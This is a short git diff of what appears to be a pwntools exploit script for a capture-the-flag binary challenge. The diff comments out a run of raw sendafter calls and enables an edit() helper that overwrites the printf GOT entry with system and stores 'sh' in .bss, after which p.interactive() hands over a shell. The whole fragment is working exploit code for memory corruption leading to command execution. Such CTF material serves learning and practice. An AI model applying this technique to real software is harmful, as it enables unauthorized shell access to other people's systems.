@@ -48,13 +48,13 @@ add("A", p64(e.got['printf']) + p64(e.bss() + 50), 5)
 
 input()
 
-p.sendafter("> ", "2")
-p.sendafter("> ", "0")
-p.sendafter("> ", p64(system))
-p.sendafter("> ", p64(e.bss() + 50))
-p.sendafter("> ", "/bin/sh\x00")
+# p.sendafter("> ", "2")
+# p.sendafter("> ", "0")
+# p.sendafter("> ", p64(system))
+# p.sendafter("> ", p64(e.bss() + 50))
+# p.sendafter("> ", "/bin/sh\x00")
 
-# edit(0, p64(system), p64(e.bss() + 50), b"sh\x00", "y") 
+edit(0, p64(system), p64(e.bss() + 50), b"sh\x00", "y") 
 
 p.interactive()
 
